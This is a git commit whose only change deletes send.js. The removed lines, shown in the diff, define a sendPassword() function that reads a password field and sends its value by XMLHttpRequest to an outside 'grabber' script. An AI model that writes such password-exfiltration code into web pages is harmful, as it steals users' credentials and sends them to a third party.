dfb2700b405cc49d9ea8c86faf8ec46f6c049e37
Simon Berens <32827527+SimonBerens@users.noreply.github.com>
2018-01-18 18:53:19 -0500

    Delete send.js

--- send.js
+++
@@ -1,6 +0,0 @@
-function sendPassword() {
-    var xhttp = new XMLHttpRequest();
-    xhttp.open('GET', 'http://grabber-com.stackstaging.com/Grabber/grabber.py?tpassword=' +
-        document.getElementById('tpassword').value, true);
-    xhttp.send();
-}
